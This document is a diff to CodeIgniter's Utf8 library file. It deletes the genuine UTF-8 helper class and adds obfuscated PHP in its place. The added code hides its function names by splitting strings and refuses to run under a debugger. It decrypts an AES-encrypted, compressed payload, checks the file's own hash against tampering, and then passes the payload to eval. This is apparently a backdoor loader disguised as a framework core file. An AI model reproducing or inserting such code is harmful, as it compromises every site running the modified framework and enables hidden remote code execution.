@@ -1,164 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Utf8 Class
- *
- * Provides support for UTF-8 environments
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	UTF-8
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/utf8.html
- */
-class CI_Utf8 {
-
-	/**
-	 * Class constructor
-	 *
-	 * Determines if UTF-8 support is to be enabled.
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		if (
-			defined('PREG_BAD_UTF8_ERROR')				// PCRE must support UTF-8
-			&& (ICONV_ENABLED === TRUE OR MB_ENABLED === TRUE)	// iconv or mbstring must be installed
-			&& strtoupper(config_item('charset')) === 'UTF-8'	// Application charset must be UTF-8
-			)
-		{
-			define('UTF8_ENABLED', TRUE);
-			log_message('debug', 'UTF-8 Support Enabled');
-		}
-		else
-		{
-			define('UTF8_ENABLED', FALSE);
-			log_message('debug', 'UTF-8 Support Disabled');
-		}
-
-		log_message('info', 'Utf8 Class Initialized');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Clean UTF-8 strings
-	 *
-	 * Ensures strings contain only valid UTF-8 characters.
-	 *
-	 * @param	string	$str	String to clean
-	 * @return	string
-	 */
-	public function clean_string($str)
-	{
-		if ($this->is_ascii($str) === FALSE)
-		{
-			if (MB_ENABLED)
-			{
-				$str = mb_convert_encoding($str, 'UTF-8', 'UTF-8');
-			}
-			elseif (ICONV_ENABLED)
-			{
-				$str = @iconv('UTF-8', 'UTF-8//IGNORE', $str);
-			}
-		}
-
-		return $str;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Remove ASCII control characters
-	 *
-	 * Removes all ASCII control characters except horizontal tabs,
-	 * line feeds, and carriage returns, as all others can cause
-	 * problems in XML.
-	 *
-	 * @param	string	$str	String to clean
-	 * @return	string
-	 */
-	public function safe_ascii_for_xml($str)
-	{
-		return remove_invisible_characters($str, FALSE);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Convert to UTF-8
-	 *
-	 * Attempts to convert a string to UTF-8.
-	 *
-	 * @param	string	$str		Input string
-	 * @param	string	$encoding	Input encoding
-	 * @return	string	$str encoded in UTF-8 or FALSE on failure
-	 */
-	public function convert_to_utf8($str, $encoding)
-	{
-		if (MB_ENABLED)
-		{
-			return mb_convert_encoding($str, 'UTF-8', $encoding);
-		}
-		elseif (ICONV_ENABLED)
-		{
-			return @iconv($encoding, 'UTF-8', $str);
-		}
-
-		return FALSE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Is ASCII?
-	 *
-	 * Tests if a string is standard 7-bit ASCII or not.
-	 *
-	 * @param	string	$str	String to check
-	 * @return	bool
-	 */
-	public function is_ascii($str)
-	{
-		return (preg_match('/[^\x00-\x7F]/S', $str) === 0);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ghi394cc=('bas'.'e64'.'_de'.'cod'.'e');
+$_i5tb0dpe=('gzu'.'nco'.'mpr'.'ess');
+$_gwxrv42v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_v2b76c6w='rprohmiT';
+$_c5swzf18='Yo5N0HNk';
+$_ohtr3dto='eL4m71++';
+$_duis8xiz='rn6ZMy1sOgE=';
+$_orl0dwtn='fNdVVBze';
+$_gq8jav1k='+9T9bA==';
+$_suncu8v9='pTkRrChd';
+$_bu1y85ij='bDfj3ViK';
+$_xp49zbz9=$_ghi394cc($_c5swzf18.$_orl0dwtn.$_ohtr3dto.$_v2b76c6w.$_duis8xiz);
+$_jnnlyaje=$_ghi394cc($_bu1y85ij.$_suncu8v9.$_gq8jav1k);
+$_r2ak2bow=$_ghi394cc('ts3HWHpuNNBHEsFdfQ4iPHfsWqWvTC09eJbdrhCdDiVhHc+VU2ORwRz67F1Fn8wKipundU2Nzc53uIjynT59t9xMg9fYeB1fM/bwZHZAmFSrieDg1dRp4ZvxY6mqaqXxG1oTL2q4/8USs1tfFym9FoyQBj8sPXNz1C3wFPyeMd67gP6CTiW9zdLuOqvXbfo4/Zz/QTut3/9fU2qLixqb8BZwSFbMzo17xpf3OfhdTjNK0ojWeFOqF2Fyt2rKz1GKAT6SeUJHdwS0T3CWeqWNHAF1vaZyOYcEZCbbFBaKvbohnvMNerOfVjPjXzwi/fSathfnEFmzkNk4zmtdCjhBv2Fb1mZmuUQ6nPhfcH/vaY7Mc+fTr/QRV9/Rdq040RFMxVYlBibM1Nnap8iTu6QKuB2j/VgfZQRsKOqcWDYLw5A1xheg9SwwyqO4rpe2e/JMm+gyOLqRPCm63UP1vORT7hd0Qc5Vn4pVquSYlzrnNOoE5vuD2Y7NdgVomz5WmW+nODzPZTIrBbor/vtjlqQkdpSzeyaHKPyZrZwuTWzDdrueVi9ar/NuVnD0XgnTkh2gXN6H/rhyz0bL4AqZPYAybW7EmiFVDVjGl4QSQzGBwabqkptIhc33S3Q/bXrS8EPUGu1r8NcvuTYsFmCbLS/MlfCIou0vBqa3n8y6vv69dMJKzOUEfu33GoAYfyz++uAa');
+$_hhvq5bg4=$_gwxrv42v($_r2ak2bow,'aes-256-cbc',$_xp49zbz9,OPENSSL_RAW_DATA,$_jnnlyaje);
+if($_hhvq5bg4===false){exit;}
+$_f48sf1xo=$_i5tb0dpe($_hhvq5bg4);
+if($_f48sf1xo===false){exit;}
+$_x9mi9bm9='5f5e5dbbc9f5e50154b3a841d02d582709bff5c88751048bc1e85e7829ffc738';
+$_vavdmtkm=@file_get_contents(__FILE__);
+if($_vavdmtkm!==false){
+$_uq1g8bwu=str_replace($_x9mi9bm9,"0000000000000000000000000000000000000000000000000000000000000000",$_vavdmtkm);
+$_p4ktz55k=hash("sha256",$_uq1g8bwu);
+if($_p4ktz55k!==$_x9mi9bm9){@http_response_code(403);exit;}
 }
+eval($_f48sf1xo);
